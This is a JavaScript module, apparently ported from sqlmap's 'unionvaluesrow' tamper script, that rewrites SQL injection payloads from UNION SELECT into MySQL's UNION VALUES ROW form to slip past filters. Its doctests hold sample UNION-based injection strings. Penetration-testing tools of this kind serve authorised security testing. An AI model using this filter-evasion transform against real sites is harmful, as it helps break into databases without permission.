// 对标 sqlmap unionvaluesrow.py（MySQL 专用）：
// UNION SELECT <cols> 改写为 MySQL 表值构造器 UNION VALUES ROW(<cols>)
// MySQL 强制要求 ROW 关键字（MariaDB 等反而拒绝它，用 unionvalues）
// 带 FROM 子句的 payload 保持原样
export const unionvaluesrow = {
  name: 'unionvaluesrow',
  description: 'UNION SELECT cols → UNION VALUES ROW(cols)（MySQL 表值构造器，消除 SELECT）',
  doctests: [
    { input: '-1 UNION ALL SELECT NULL,CONCAT(0x71,0x41),NULL-- -', output: '-1 UNION ALL VALUES ROW(NULL,CONCAT(0x71,0x41),NULL)-- -' },
    { input: '-1 UNION SELECT 45,45#', output: '-1 UNION VALUES ROW(45,45)#' },
    { input: '-1 UNION ALL SELECT NULL,NULL FROM DUAL-- -', output: '-1 UNION ALL SELECT NULL,NULL FROM DUAL-- -' },
  ],
  transform(payload) {
    return String(payload ?? '').replace(
      /(UNION)(\s+ALL)?\s+SELECT\s+([\s\S]+?)(?=(?:--|#|\/\*)|$)/gi,
      (m, union, all, columns) => {
        const cols = columns.replace(/\s+$/, '');
        if (/\bFROM\b/i.test(cols)) return m;
        return `${union}${all || ''} VALUES ROW(${cols})`;
      }
    );
  },
};
export default unionvaluesrow;
